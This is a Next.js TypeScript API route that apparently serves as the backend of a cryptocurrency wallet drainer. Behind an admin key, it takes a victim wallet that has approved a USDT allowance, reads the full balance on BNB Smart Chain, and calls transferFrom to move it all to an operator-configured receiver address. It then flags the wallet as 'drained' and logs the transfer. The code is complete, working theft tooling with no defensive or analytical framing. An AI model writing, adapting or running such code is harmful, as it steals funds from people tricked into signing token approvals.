import { NextRequest, NextResponse } from "next/server";
import { getServiceSupabase } from "@/lib/supabase";
import { ethers } from "ethers";

const USDT_ABI = [
  "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
  "function balanceOf(address owner) public view returns (uint256)",
  "function allowance(address owner, address spender) public view returns (uint256)",
];

// POST /api/wallets/[id]/withdraw — manually trigger a drain for a specific wallet
export async function POST(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  const adminKey = req.headers.get("x-admin-key");
  if (adminKey !== process.env.ADMIN_PASSWORD) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const { id } = await params;
  const supabase = getServiceSupabase();

  // Fetch wallet record
  const { data: wallet, error: fetchError } = await supabase
    .from("wallets")
    .select("*")
    .eq("id", id)
    .single();

  if (fetchError || !wallet) {
    return NextResponse.json({ error: "Wallet not found" }, { status: 404 });
  }

  if (!wallet.approval_status) {
    return NextResponse.json({ error: "Wallet has not approved" }, { status: 400 });
  }

  // Fetch receiver address from config
  const { data: configRow } = await supabase
    .from("config")
    .select("value")
    .eq("key", "receiver_address")
    .single();

  const receiverAddress = configRow?.value;
  if (!receiverAddress) {
    return NextResponse.json({ error: "Receiver address not configured" }, { status: 500 });
  }

  try {
    const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL ?? "https://bsc-dataseed.binance.org/");
    const adminWallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY!, provider);
    const contract = new ethers.Contract(process.env.NEXT_PUBLIC_USDT_CONTRACT!, USDT_ABI, adminWallet);

    const balance: bigint = await contract.balanceOf(wallet.address);
    if (balance === BigInt(0)) {
      return NextResponse.json({ error: "Wallet USDT balance is zero" }, { status: 400 });
    }

    const tx = await contract.transferFrom(wallet.address, receiverAddress, balance);
    const receipt = await tx.wait();

    const amountFormatted = ethers.formatUnits(balance, 18);

    // Update wallet record
    await supabase
      .from("wallets")
      .update({ drained: true, drain_tx_hash: receipt.hash })
      .eq("id", id);

    // Log transaction
    await supabase.from("transactions").insert({
      wallet_address: wallet.address,
      type: "drain",
      tx_hash: receipt.hash,
      amount_usdt: amountFormatted,
      status: "success",
    });

    return NextResponse.json({ success: true, txHash: receipt.hash, amount: amountFormatted });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : "Unknown error";

    await supabase.from("transactions").insert({
      wallet_address: wallet.address,
      type: "drain",
      status: "failed",
      amount_usdt: "0",
    });

    return NextResponse.json({ error: message }, { status: 500 });
  }
}
